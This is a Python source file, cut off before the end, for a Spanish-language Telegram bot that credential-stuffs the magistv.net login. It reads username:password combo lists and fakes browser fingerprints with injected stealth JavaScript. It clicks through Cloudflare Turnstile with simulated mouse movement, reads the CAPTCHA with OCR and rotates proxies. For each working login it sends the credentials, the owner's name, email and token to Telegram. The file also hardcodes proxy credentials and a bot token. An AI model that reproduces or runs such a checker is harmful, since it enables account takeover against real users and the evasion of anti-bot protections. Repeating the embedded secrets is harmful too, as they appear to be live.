#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║   🎬 Flujo TV — Telegram Bot (VPS + Xvfb)                 ║
║   headless=False + Diagnóstico CF + Modo Sin Proxy         ║
╚══════════════════════════════════════════════════════════════╝
"""

import subprocess, sys, os, time, base64, re, traceback, random, json, multiprocessing, threading
import urllib.request, urllib.parse, urllib.error
from datetime import datetime

PROXY = {
    "host": "proxy.flameproxies.com",
    "port": 8989,
    "user": "flm271a2045-package-standard",
    "pass": "3eb53887",
}
ROTATE_EVERY = 10
TG_TOKEN = "8594813440:AAFFKfWwup01Si1C-exXIN2InTABuKgRv7g"
ADMIN_IDS = []

BOT_DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_data")
os.makedirs(BOT_DATA_DIR, exist_ok=True)
STOP_FILE = "/tmp/flujo_bot_stop"
SCREENSHOT_DIR = os.path.join(BOT_DATA_DIR, "screenshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

if not os.environ.get("DISPLAY"):
    os.environ["DISPLAY"] = ":99"

bot_state = {
    "running": False,
    "current_chat": None,
    "_start_time": None,
    "_process": None,
    "debug_sent": 0,
    "force_no_proxy": False,
}

def get_proxy_conf():
    return {
        "server": f"http://{PROXY['host']}:{PROXY['port']}",
        "username": PROXY["user"],
        "password": PROXY["pass"],
    }

# ════════════════════════════════════════════════════════════════════════
#  TELEGRAM API
# ════════════════════════════════════════════════════════════════════════

def tg_api(method, params=None, files=None, timeout=30):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/{method}"
    data = None
    req = None
    try:
        if files:
            boundary = f"----Bound{random.randint(1000000000,9999999999)}"
            body = b""
            for k, v in (params or {}).items():
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
            for k, (fname, fdata) in files.items():
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fname}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
                body += fdata if isinstance(fdata, bytes) else fdata.encode()
                body += b"\r\n"
            body += f"--{boundary}--\r\n".encode()
            req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        elif params:
            data = urllib.parse.urlencode(params).encode()
            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        else:
            req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = e.read().decode("utf-8", errors="ignore")
        except: body = ""
        return {"ok": False, "error_code": e.code, "description": str(e), "body": body}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def tg_send_msg(chat_id, text, parse_mode="HTML", reply_markup=None, disable_notification=False):
    params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}
    if reply_markup: params["reply_markup"] = json.dumps(reply_markup)
    if disable_notification: params["disable_notification"] = True
    return tg_api("sendMessage", params)

def tg_edit_msg(chat_id, msg_id, text, parse_mode="HTML", reply_markup=None):
    params = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": parse_mode}
    if reply_markup: params["reply_markup"] = json.dumps(reply_markup)
    return tg_api("editMessageText", params)

def tg_send_doc(chat_id, filename, content, caption=None):
    files = {"document": (filename, content if isinstance(content, bytes) else content.encode("utf-8"))}
    params = {"chat_id": chat_id}
    if caption: params["caption"] = caption
    return tg_api("sendDocument", params, files=files, timeout=120)

def tg_send_photo(chat_id, photo_bytes, caption=None):
    files = {"photo": ("screenshot.png", photo_bytes)}
    params = {"chat_id": chat_id}
    if caption: params["caption"] = caption
    return tg_api("sendPhoto", params, files=files, timeout=60)

def tg_answer_cb(query_id, text=None, show_alert=False):
    params = {"callback_query_id": query_id}
    if text: params["text"] = text; params["show_alert"] = show_alert
    return tg_api("answerCallbackQuery", params)

def tg_download_file(file_id):
    r = tg_api("getFile", {"file_id": file_id})
    if not r.get("ok") or not r.get("result", {}).get("file_path"): return None
    file_path = r["result"]["file_path"]
    dl_url = f"https://api.telegram.org/file/bot{TG_TOKEN}/{file_path}"
    try:
        with urllib.request.urlopen(dl_url, timeout=60) as resp:
            return resp.read()
    except: return None

def escape_html(t):
    return str(t).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

# ════════════════════════════════════════════════════════════════════════
#  TECLADOS
# ════════════════════════════════════════════════════════════════════════

def kb_main():
    return {"inline_keyboard": [
        [{"text": "🚀 Enviar Combo (Proxy)", "callback_data": "send_combo"}, {"text": "🌐 Sin Proxy", "callback_data": "send_local"}],
        [{"text": "🔬 Testear CF", "callback_data": "test_cf"}, {"text": "⏹ Detener", "callback_data": "stop"}],
    ]}

def kb_cancel():
    return {"inline_keyboard": [[{"text": "⏹ Cancelar", "callback_data": "cancel_check"}]]}

# ════════════════════════════════════════════════════════════════════════
#  DEPENDENCIAS
# ════════════════════════════════════════════════════════════════════════

def run_cmd(cmd, timeout=300):
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        out = [l.rstrip() for l in proc.stdout if l.rstrip()]
        proc.wait(timeout=timeout)
        return proc.returncode == 0, "\n".join(out)
    except subprocess.TimeoutExpired: proc.kill(); return False, "Timeout"
    except Exception as e: return False, str(e)

def pip_install(pkg):
    for cmd in [[sys.executable,"-m","pip","install","-q",pkg],
                [sys.executable,"-m","pip","install","-q","--user",pkg],
                [sys.executable,"-m","pip","install","-q","--break-system-packages",pkg]]:
        ok, _ = run_cmd(cmd)
        if ok: return True
    return False

def ensure_mod(imp, pip=None):
    pip = pip or imp
    try: __import__(imp); return True
    except ImportError: pass
    if pip_install(pip):
        try: __import__(imp); return True
        except: pass
    return False

def setup_deps():
    pw = ensure_mod("playwright")
    ocr = ensure_mod("ddddocr")
    if not pw: return False, False
    ok, out = run_cmd([sys.executable, "-m", "playwright", "install", "--with-deps", "chromium"], timeout=300)
    if not ok: print(f"  [!] Chromium: {out[:200]}")
    return True, ocr

# ════════════════════════════════════════════════════════════════════════
#  PARSEAR COMBO
# ════════════════════════════════════════════════════════════════════════

def parse_combo(text):
    accounts = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        fp = re.split(r"[:;|,\s]+", line, maxsplit=1)[0]
        if "/" in fp or fp.startswith("http") or len(fp) > 40: continue
        parts = re.split(r"[:;|,\s]+", line, maxsplit=1)
        if len(parts) == 2 and parts[0] and parts[1]:
            u, p = parts[0].strip(), parts[1].strip()
            if len(u) <= 35 and len(p) <= 60:
                accounts.append((u, p))
    return accounts

# ════════════════════════════════════════════════════════════════════════
#  OCR
# ════════════════════════════════════════════════════════════════════════

def init_ocr():
    if not ensure_mod("ddddocr"): return None
    try:
        import ddddocr
        try: return ddddocr.DdddOcr(show_ad=False)
        except TypeError: return ddddocr.DdddOcr()
    except: return None

def ocr_solve(eng, b64):
    if "," in b64: b64 = b64.split(",", 1)[1]
    img = base64.b64decode(b64)
    return re.sub(r"[^a-zA-Z0-9]", "", eng.classification(img))

def get_captcha_img(page):
    try:
        for im in page.locator('img[src^="data:image/png;base64,"]').all():
            src = im.get_attribute("src") or ""
            if len(src) > 500: return src
    except: pass
    return None

# ════════════════════════════════════════════════════════════════════════
#  STEALTH + MOUSE + CF
# ════════════════════════════════════════════════════════════════════════

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
Object.defineProperty(navigator, 'languages', {get: () => ['es-ES', 'es', 'en-US', 'en']});
Object.defineProperty(navigator, 'platform', {get: () => 'Linux armv81'});
window.chrome = {runtime: {}, loadTimes: function(){}, csi: function(){}};
const originalQuery = window.navigator.permissions.query;
window.navigator.permissions.query = (parameters) =>
    parameters.name === 'notifications'
        ? Promise.resolve({state: Notification.permission})
        : originalQuery(parameters);
Object.defineProperty(navigator, 'plugins', {
    get: () => [1, 2, 3, 4, 5].map(() => ({
        name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer',
        description: 'Portable Document Format', length: 1
    }))
});
const getParameter = WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter = function(parameter) {
    if (parameter === 37445) return 'Intel Inc.';
    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
    return getParameter.call(this, parameter);
};
window._mx = 210; window._my = 450;
document.addEventListener('mousemove', e => { window._mx = e.clientX; window._my = e.clientY; });
const elementDescriptor = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'contentWindow');
Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {
    get: function() { try { return elementDescriptor.get.call(this); } catch(e) { return null; } }
});
"""

def human_click(page, x, y):
    steps = random.randint(20, 40)
    try: cur = page.evaluate("()=>({x:window._mx||210,y:window._my||450})")
    except: cur = {"x": 210, "y": 450}
    cx, cy = cur["x"], cur["y"]
    for i in range(steps):
        p = i / steps
        page.mouse.move(cx+(x-cx)*p+random.gauss(0,2), cy+(y-cy)*p+random.gauss(0,2))
        time.sleep(random.uniform(0.003, 0.012))
    page.mouse.click(x+random.uniform(-1,1), y+random.uniform(-1,1))
    time.sleep(random.uniform(0.2, 0.5))

def _has_login(page):
    try: return page.locator("input[type='text']").count() > 0
    except: return False

def solve_turnstile(page, max_a=8):
    for att in range(1, max_a+1):
        try:
            for ifr in page.locator("iframe").all():
                src = ifr.get_attribute("src") or ""
                tit = ifr.get_attribute("title") or ""
                if "challenges.cloudflare.com" in src or "turnstile" in tit.lower():
                    box = ifr.bounding_box()
                    if box and box["width"] > 0:
                        page.mouse.move(box["x"]+random.randint(50,150), box["y"]+random.randint(-80,80))
                        time.sleep(random.uniform(0.5, 1.0))
                        human_click(page, box["x"]+28, box["y"]+box["height"]/2)
                        page.wait_for_timeout(5000)
                        if _has_login(page): return True
        except: pass
        try:
            for frame in page.frames:
                if "challenges.cloudflare.com" in (frame.url or ""):
                    for sel in [".mark","label",".cb-lb","input[type='checkbox']"]:
                        try:
                            el = frame.locator(sel).first
                            if el.is_visible(timeout=500):
                                box = el.bounding_box()
                                if box:
                                    human_click(page, box["x"]+box["width"]/2, box["y"]+box["height"]/2)
                                    page.wait_for_timeout(5000)
                                    if _has_login(page): return True
                        except: pass
        except: pass
        page.wait_for_timeout(2000)
    return False

def handle_cf(page, chat_id=None):
    page.wait_for_timeout(3000)
    if _has_login(page): return True
    has_ts = False
    try:
        for f in page.locator("iframe").all():
            s = f.get_attribute("src") or ""; t = f.get_attribute("title") or ""
            if "challenges.cloudflare.com" in s or "turnstile" in t.lower(): has_ts = True; break
    except: pass
    if not has_ts:
        for _ in range(20):
            page.wait_for_timeout(1000)
            if _has_login(page): return True
            try:
                for fr in page.frames:
                    if "challenges.cloudflare.com" in (fr.url or ""): has_ts = True; break
            except: pass
            if has_ts: break
    if has_ts:
        if solve_turnstile(page): return True
    for _ in range(20):
        page.wait_for_timeout(1000)
        if _has_login(page): return True
    return False

# ════════════════════════════════════════════════════════════════════════
#  HELPERS
# ════════════════════════════════════════════════════════════════════════

def clear_auth(ctx):
    try:
        cookies = ctx.cookies()
        ctx.clear_cookies()
        ctx.add_cookies([c for c in cookies if c.get("name") != "msgistv-token"])
    except: pass

def get_page_errors(page):
    sels = ['.ant-message-error','.ant-message-notice-content','.ant-form-item-explain-error',
            '.ant-alert-error','.ant-alert-message','[role="alert"]','[class*="error-text"]']
    msgs = []
    for sel in sels:
        try:
            for el in page.locator(sel).all():
                if el.is_visible(timeout=200):
                    t = (el.text_content() or "").strip()
                    if t and 1 < len(t) < 300 and t not in msgs: msgs.append(t)
        except: continue
    return msgs

def translate_err(code, msg):
    m = (msg or "").lower()
    if not m:
        if code == 500: return "Error server"
        if code == 401: return "Credenciales inválidas"
        return f"Error {code}"
    if "restrin" in m: return "🚫 IP restringida"
    if any(k in m for k in ["incorrect","password","wrong","bad cred","login fail"]): return "❌ Credenciales incorrectas"
    if any(k in m for k in ["not found","no existe"]): return "❌ No existe"
    if any(k in m for k in ["locked","bloquead","disabled","banned"]): return "🔒 Bloqueada"
    if any(k in m for k in ["captcha","código","codigo"]): return "🔄 Captcha error"
    return f"⚠️ {msg[:50]}"

def is_ip_restricted(msg):
    m = (msg or "").lower()
    return "restrin" in m or "restricted" in m

def check_ip_fast(context):
    try:
        ip_page = context.new_page()
        ip_page.goto("https://api.ipify.org?format=text", timeout=12000, wait_until="domcontentloaded")
        ip = (ip_page.inner_text("body") or "").strip()
        ip_page.close()
        return ip if ip and re.match(r'^[\d.:a-fA-F]+$', ip) else "?"
    except:
        try: ip_page.close()
        except: pass
        return "?"

def send_debug_screenshot(page, chat_id, label="debug"):
    if bot_state.get("debug_sent", 0) >= 3: return
    try:
        path = os.path.join(SCREENSHOT_DIR, f"{label}_{int(time.time())}.png")
        page.screenshot(path=path, full_page=False)
        with open(path, "rb") as f: img_data = f.read()
        title = page.title() or "?"; url = page.url or "?"
        caption = f"🐛 <b>Debug:</b> {label}\n📄 {escape_html(title)}\n🔗 {escape_html(url)}"
        tg_send_photo(chat_id, img_data, caption=caption)
        bot_state["debug_sent"] = bot_state.get("debug_sent", 0) + 1
        os.remove(path)
    except Exception as e:
        print(f"  [!] Screenshot error: {e}")

def update_progress(chat_id, msg_id, account_name, result_str, stats):
    try:
        if not msg_id: return
        elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
        speed = stats["processed"] / elapsed if elapsed > 0 else 0
        remaining = stats["total"] - stats["processed"]
        eta = remaining / speed if speed > 0 else 0
        eta_str = f"{int(eta//60)}m {int(eta%60)}s" if eta > 0 else "—"
        pct = (stats["processed"] / stats["total"] * 100) if stats["total"] > 0 else 0
        bar_len = 15
        filled = int(bar_len * pct / 100)
        bar = "█" * filled + "░" * (bar_len - filled)
        txt = (
            f"🎬 <b>Flujo TV Checker</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"[{bar}] {pct:.0f}%\n"
            f"📊 {stats['processed']}/{stats['total']}\n"
            f"💰 Hits: <b>{stats['hits']}</b>\n"
            f"❌ Fails: {stats['fails']}\n"
            f"⚡ {speed:.1f}/s │ ⏱ ETA: {eta_str}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔄 <code>{escape_html(account_name)}</code>\n"
            f"   {result_str}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 IP: {stats.get('ip','?')}"
        )
        tg_edit_msg(chat_id, msg_id, txt, reply_markup=kb_cancel())
    except: pass

# ════════════════════════════════════════════════════════════════════════
#  DIAGNÓSTICO CF
# ════════════════════════════════════════════════════════════════════════

def test_cf_diagnostic(chat_id):
    from playwright.sync_api import sync_playwright
    UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    tg_send_msg(chat_id, "🔬 Ejecutando diagnóstico de Cloudflare (con proxy)...")
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False, args=["--no-sandbox", "--disable-blink-features=AutomationControlled"])
            ctx_kw = {
                "user_agent": UA,
                "viewport": {"width": 420, "height": 900},
                "proxy": get_proxy_conf(),
                "extra_http_headers": {"Accept-Language": "es-ES,es;q=0.9"}
            }
            context = browser.new_context(**ctx_kw)
            context.add_init_script(STEALTH_JS)
            page = context.new_page()
            
            error_msg = "Ninguno"
            try:
                resp = page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=30000)
                page.wait_for_timeout(5000)
            except Exception as e:
                error_msg = str(e)[:150]
                
            title = page.title() or "?"
            url = page.url or "?"
            has_iframes = page.locator("iframe").count()
            has_inputs = page.locator("input").count()
            
            path = os.path.join(SCREENSHOT_DIR, "diag.png")
            page.screenshot(path=path)
            with open(path, "rb") as f: img_data = f.read()
            os.remove(path)
            
            is_ok = "login" in url.lower() and has_inputs > 0
            
            if is_ok:
                result_txt = "🟢 <b>ÉXITO</b>\nEl proxy PASA Cloudflare correctamente."
            else:
                result_txt = "🔴 <b>FALLÓ</b>\nEl proxy NO puede cargar la página."
                if "terminated prematurely" in error_msg.lower() or "incomplete read" in error_msg.lower():
                    result_txt += "\n\n⚠️ <b>DIAGNÓSTICO:</b> Tu proxy está cortando la conexión a medio cargar (incomplete read). Cloudflare necesita cargar scripts pesados y tu proxy los bloquea.\n\n<b>Solución:</b>\n1. Contacta a tu proveedor de proxy y pide uno que soporte Cloudflare Turnstile\n2. Cambia de proveedor (ej: BrightData, IPRoyal)"
                elif "timeout" in error_msg.lower():
                    result_txt += "\n\n⚠️ El proxy tardó demasiado y dio timeout."
                elif "err_proxy" in error_msg.lower() or "407" in error_msg:
                    result_txt += "\n\n⚠️ Credenciales de proxy incorrectas o no autorizadas."

            caption = f"{result_txt}\n\n📄 Title: <code>{escape_html(title)}</code>\n🔗 URL: <code>{escape_html(url)}</code>\n🖼 Iframes: {has_iframes} | Inputs: {has_inputs}\n❌ Error: <code>{escape_html(error_msg)}</code>"
            
            tg_send_photo(chat_id, img_data, caption)
            browser.close()
            
    except Exception as e:
        tg_send_msg(chat_id, f"❌ Error crítico en diagnóstico:\n<code>{escape_html(str(e))}</code>")

# ════════════════════════════════════════════════════════════════════════
#  MOTOR DE CHECK
# ════════════════════════════════════════════════════════════════════════

def run_checker(accounts, chat_id, msg_id, use_proxy):
    from playwright.sync_api import sync_playwright
    hits = []
    hits_lines = []
    errors = {}
    processed = 0
    fails = 0
    start_time = time.time()
    bot_state["debug_sent"] = 0
    stats = {
        "total": len(accounts), "hits": 0, "fails": 0,
        "processed": 0, "start_time": start_time, "ip": "VPS Directa" if not use_proxy else "?",
    }
    ocr_engine = init_ocr()
    use_ocr = ocr_engine is not None
    UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=False,
            args=["--disable-blink-features=AutomationControlled","--no-sandbox","--disable-dev-shm-usage","--disable-infobars","--window-size=420,900","--no-first-run","--no-default-browser-check","--disable-extensions"],
        )
        idx = 0
        batch_num = 0
        consecutive_cf_fails = 0

        while idx < len(accounts):
            if os.path.exists(STOP_FILE):
                try: tg_edit_msg(chat_id, msg_id, "⏹ <b>Detenido por usuario</b>", reply_markup=kb_main())
                except: pass
                try: browser.close()
                except: pass
                return hits, hits_lines

            batch_num += 1
            batch_end = min(idx + ROTATE_EVERY, len(accounts))
            ctx_kw = {
                "user_agent": UA, "viewport": {"width": 420, "height": 900},
                "is_mobile": True, "has_touch": True, "screen": {"width": 420, "height": 900}, "device_scale_factor": 2.5,
                "extra_http_headers": {
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Upgrade-Insecure-Requests": "1",
                },
            }
            if use_proxy:
                ctx_kw["proxy"] = get_proxy_conf()

            context = None
            page = None
            try:
                context = browser.new_context(**ctx_kw)
                context.add_init_script(STEALTH_JS)
                page = context.new_page()
            except Exception as e:
                fails += (batch_end - idx); processed += (batch_end - idx)
                stats["fails"] = fails; stats["processed"] = processed
                update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Ctx error: {str(e)[:40]}", stats)
                idx = batch_end; continue

            nav_ok = False
            nav_error = ""
            for attempt in range(3):
                try:
                    page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=45000)
                    nav_ok = True; break
                except Exception as e:
                    nav_error = str(e)[:100]
                    time.sleep(3)

            if not nav_ok:
                fails += (batch_end - idx); processed += (batch_end - idx)
                stats["fails"] = fails; stats["processed"] = processed
                update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Nav fail", stats)
                consecutive_cf_fails += 1
                try:
                    send_debug_screenshot(page, chat_id, f"nav_fail_b{batch_num}")
                    tg_send_msg(chat_id, f"🐛 <b>Nav Fail B{batch_num}</b>\n<code>{escape_html(nav_error)}</code>", disable_notification=True)
                except: pass
                if consecutive_cf_fails >= 2:
                    tg_send_msg(chat_id, "⚠️ Fallo consecutivo — pausa 10s", disable_notification=True)
                    time.sleep(10); consecutive_cf_fails = 0
                idx = batch_end
                try: context.close()
                except: pass
                continue

            cf_ok = handle_cf(page, chat_id)
            if not cf_ok:
                fails += (batch_end - idx); processed += (batch_end - idx)
                stats["fails"] = fails; stats["processed"] = processed
                update_progress(chat_id, msg_id, f"Batch {batch_num}", "CF fail", stats)
                consecutive_cf_fails += 1
                try:
                    send_debug_screenshot(page, chat_id, f"cf_fail_b{batch_num}")
                except: pass
                if consecutive_cf_fails >= 2:
                    tg_send_msg(chat_id, "⚠️ CF Fail consecutivo — pausa 15s", disable_notification=True)
                    time.sleep(15); consecutive_cf_fails = 0
                idx = batch_end
                try: context.close()
                except: pass
                continue

            consecutive_cf_fails = 0

            if use_proxy:
                ip = check_ip_fast(context)
                stats["ip"] = ip
                print(f"  [🔄] Batch {batch_num} — IP: {ip}")
            else:
                stats["ip"] = "VPS"

            state = {}
            NON_LOGIN = ["/codigo", "/info", "/dashboard", "/home/img", "/img"]

            def make_on_resp(st):
                def on_resp(resp):
                    url = resp.url
                    try:
                        if "/api/v1/magis/codigo" in url and resp.status == 200:
                            d = resp.json()
                            if d.get("code") == 200:
                                st["cap_uuid"] = d["data"]["uuid"]; st["cap_b64"] = d["data"]["data"]
                    except: pass
                    try:
                        if "/api/v1/magis/info" in url and resp.status == 200:
                            d = resp.json()
                            if d.get("code") == 200 and d.get("data"): st["info"] = d["data"]
                            elif "restrin" in d.get("msg", "").lower():
                                st["login_code"] = d.get("code", 500); st["login_msg"] = d.get("msg", ""); st["api_hit"] = True
                    except: pass
                    try:
                        if "/api/v1/magis/dashboard" in url and resp.status == 200:
                            d = resp.json()
                            if d.get("code") == 200 and d.get("data"): st["dashboard"] = d["data"]
                    except: pass
                    if "/api/" in url:
                        login_kw = ["/login", "/signin", "/auth", "/authenticate"]
                        is_login = any(l in url.lower() for l in login_kw)
                        after_click = st.get("clicked_at", 0) > 0 and (time.time() - st["clicked_at"]) < 15
                        if (is_login or after_click) and not st.get("api_hit") and not any(n in url for n in NON_LOGIN):
                            try:
                                d = resp.json()
                                st["api_hit"] = True; st["login_code"] = d.get("code", resp.status); st["login_msg"] = d.get("msg", "")
                                if d.get("code") == 200:
                                    st["login_ok"] = True
                                    tok = d.get("data", {}).get("token") if isinstance(d.get("data"), dict) else None
                                    if tok: st["token"] = tok
                            except:
                                st["api_hit"] = True; st["login_code"] = resp.status
                return on_resp

            page.on("response", make_on_resp(state))
            ip_restricted = False

            for local_i in range(batch_end - idx):
                if os.path.exists(STOP_FILE): break
                user, pwd = accounts[idx]
                processed += 1
                stats["processed"] = processed
                state.clear()
                state.update({"cap_uuid": None, "cap_b64": None, "info": None, "dashboard": None, "token": None, "login_ok": False, "login_msg": "", "login_code": -1, "api_hit": False, "clicked_at": 0})
                clear_auth(context)

                try:
                    page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=25000)
                except:
                    try: page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=25000)
                    except:
                        fails += 1; stats["fails"] = fails; reason = "Nav error"; errors[reason] = errors.get(reason, 0) + 1
                        update_progress(chat_id, msg_id, user, reason, stats); idx += 1; continue

                page.wait_for_timeout(1200)
                if not _has_login(page):
                    if not handle_cf(page, chat_id):
                        fails += 1; stats["fails"] = fails; reason = "CF fail"; errors[reason] = errors.get(reason, 0) + 1
                        update_progress(chat_id, msg_id, user, reason, stats); idx += 1; continue

                try:
                    el = page.locator('input[type="text"]').first
                    el.wait_for(state="visible", timeout=3000); el.click(); time.sleep(0.1); el.fill(user)
                except:
                    fails += 1; stats["fails"] = fails; reason = "No input user"; errors[reason] = errors.get(reason, 0) + 1
                    update_progress(chat_id, msg_id, user, reason, stats); idx += 1; continue

                time.sleep(0.2)
                try:
                    pw_el = page.locator('input[type="password"]').first
                    pw_el.wait_for(state="visible", timeout=3000); pw_el.click(); time.sleep(0.1); pw_el.fill(pwd)
                except:
                    fails += 1; stats["fails"] = fails; reason = "No input pass"; errors[reason] = errors.get(reason, 0) + 1
                    update_progress(chat_id, msg_id, user, reason, stats); idx += 1; continue

                time.sleep(0.2)
                login_success = False
                for ci in range(1, 4):
                    if ci > 1:
                        state["cap_uuid"] = None; state["cap_b64"] = None
                        try:
                            img = page.locator('img[src^="data:image"]').first
                            if img.is_visible(timeout=1000): img.click(); page.wait_for_timeout(1500)
                        except: pass

                    if not state.get("cap_b64"):
                        pg = get_captcha_img(page)
                        if pg: state["cap_b64"] = pg
                        if not state.get("cap_b64"):
                            for _ in range(8):
                                if state.get("cap_b64"): break
                                page.wait_for_timeout(800)

                    cap_filled = False
                    if use_ocr and state.get("cap_b64"):
                        try:
                            ct = ocr_solve(ocr_engine, state["cap_b64"])
                            if ct:
                                for sel in ['input[placeholder="validateCode"]', 'input[placeholder*="code" i]']:
                                    try:
                                        el = page.locator(sel).first
                                        if el.is_visible(timeout=500):
                                            el.click(); el.fill(""); el.fill(ct); cap_filled = True; break
                                    except: continue
                                if not cap_filled:
                                    try:
                                        inputs = page.locator("input").all()
                                        for inp in reversed(inputs):
                                            tp = inp.get_attribute("type") or "text"
                                            if tp in ("text", "") and inp.is_visible() and not inp.input_value():
                                                inp.click(); inp.fill(""); inp.fill(ct); cap_filled = True; break
                                    except: pass
                        except: pass

                    state["clicked_at"] = time.time(); state["api_hit"] = False
                    btn_ok = False
                    for sel in ['button[type="submit"]', 'button:has-text("Login")', '.ant-btn-primary', 'button[class*="login"]']:
                        try:
                            el = page.locator(sel).first
                            if el.is_visible(timeout=500): el.click(); btn_ok = True; break
                        except: continue
                    if not btn_ok: state["clicked_at"] = time.time()

                    success = False
                    for w in range(20):
                        if state.get("login_ok"): success = True; break
                        if "/mobile/home" in page.url: success = True; break
                        try:
                            for c in context.cookies():
                                if "msgistv-token" in c.get("name", "") and c.get("value"): success = True; break
                        except: pass
                        if success: break
                        if state.get("api_hit") and state["login_code"] != 200: break
                        if w >= 3 and not state.get("api_hit"):
                            pe = get_page_errors(page)
                            if pe: break
                        page.wait_for_timeout(800)

                    if success: login_success = True; break
                    msg = (state.get("login_msg") or "").lower()
                    if any(k in msg for k in ["captcha", "código", "codigo", "code", "valida"]):
                        try:
                            for sel in ['input[placeholder="validateCode"]', 'input[placeholder*="code" i]']:
                                el = page.locator(sel).first
                                if el.is_visible(timeout=400): el.fill("")
                        except: pass
                        continue
                    break

                if state.get("api_hit") and is_ip_restricted(state.get("login_msg", "")):
                    fails += 1; stats["fails"] = fails; reason = "🚫 IP restringida"; errors[reason] = errors.get(reason, 0) + 1
                    update_progress(chat_id, msg_id, user, reason, stats); idx += 1; ip_restricted = True; break

                if login_success or state.get("login_ok") or "/mobile/home" in page.url:
                    if not state.get("token"):
                        try:
                            for c in context.cookies():
                                if "msgistv-token" in c.get("name", ""): state["token"] = c.get("value"); break
                        except: pass
                    try: page.goto("https://vip.magistv.net/mobile/home", wait_until="domcontentloaded", timeout=12000)
                    except: pass
                    for _ in range(12):
                        if state.get("info") and state.get("dashboard"): break
                        page.wait_for_timeout(800)
                    if not state.get("info") or not state.get("dashboard"):
                        try: page.reload(wait_until="domcontentloaded", timeout=8000); page.wait_for_timeout(2500)
                        except: pass

                    info = state.get("info") or {}; dash = state.get("dashboard") or {}
                    rev = "✅" if info.get("is_revendedor") else "❌"; sup = "✅" if info.get("is_super") else "❌"
                    hit = {"username": user, "password": pwd, "info": info, "dashboard": dash, "token": state.get("token")}
                    hits.append(hit); hits_lines.append(f"{user}:{pwd}"); stats["hits"] += 1

                    detail = f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name', '—')}\n🆔 {info.get('id', '—')}\n📧 {info.get('email', '') or '—'}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 Total:{dash.get('sumNum', 0)} ✅ Act:{dash.get('activeNum', 0)}"
                    result_str = f"💰 <b>HIT!</b> Rev={rev} Sup={sup} T={dash.get('sumNum','?')} A={dash.get('activeNum','?')}"
                    update_progress(chat_id, msg_id, user, result_str, stats)
                    try: tg_send_msg(chat_id, detail, disable_notification=True)
                    except: pass
                    print(f"  [💰] HIT #{len(hits)} — {user}")
                else:
                    fails += 1; stats["fails"] = fails
                    if state.get("api_hit"): reason = translate_err(state["login_code"], state["login_msg"])
                    else:
                        pe = get_page_errors(page)
                        reason = pe[0] if pe else "Sin respuesta"
                    errors[reason] = errors.get(reason, 0) + 1
                    update_progress(chat_id, msg_id, user, reason, stats)

                idx += 1
                time.sleep(0.3)

            try: context.close()
            except: pass
            if ip_restricted: continue

        try: browser.close()
        except: pass

    return hits, hits_lines

# ════════════════════════════════════════════════════════════════════════
#  START CHECK
# ════════════════════════════════════════════════════════════════════════

waiting_combo = set()

def start_check(accounts, chat_id, use_proxy=True):
    if bot_state["running"]:
        tg_send_msg(chat_id, "⏳ Ya hay un check en proceso.", reply_markup=kb_main())
        return
    if os.path.exists(STOP_FILE): os.remove(STOP_FILE)
    bot_state["running"] = True
    bot_state["current_chat"] = chat_id
    bot_state["_start_time"] = time.time()
    bot_state["debug_sent"] = 0

    mode = "CON PROXY" if use_proxy else "SIN PROXY (IP VPS)"
    tg_send_msg(chat_id, f"🚀 <b>Iniciando check {mode}...</b>\n📊 {len(accounts)} cuentas")
    r = tg_send_msg(chat_id, "⏳ Preparando...", reply_markup=kb_cancel())
    prog_msg_id = r.get("result", {}).get("message_id") if r.get("ok") else None

